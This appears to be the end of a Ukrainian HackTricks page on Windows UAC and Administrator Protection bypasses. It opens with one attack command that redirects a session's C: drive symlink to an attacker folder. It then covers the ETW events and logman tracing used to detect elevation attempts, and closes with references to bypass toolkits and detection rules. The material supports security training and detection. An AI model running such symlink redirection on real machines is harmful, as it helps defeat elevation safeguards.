New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
На вузлах попереднього перегляду Administrator Protection записує схвалення та невдалі спроби як події ETW **15031** і **15032** у постачальнику `Microsoft-Windows-LUA`. Події містять SID запитувача, шлях до застосунку, результат, керований обліковий запис адміністратора та метод автентифікації, тому повторні спроби експлуатації або невдале керування інтерфейсом не залишаються без телеметрії.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Як працює User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – колекція технік обходу UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – сканер сумісності та launcher для обходу UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI використовує AI для генерації PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: експлуатація 0-Day проти урядових цілей у Південно-Східній Азії](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Обхід Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Обхід UAC за допомогою завдання SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – обходи UnifiedConsent, TabTip і Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Захист адміністратора](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Виклик локальних Windows RPC-серверів із .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte удосконалює CoolClient за допомогою підписаного Windows kernel rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
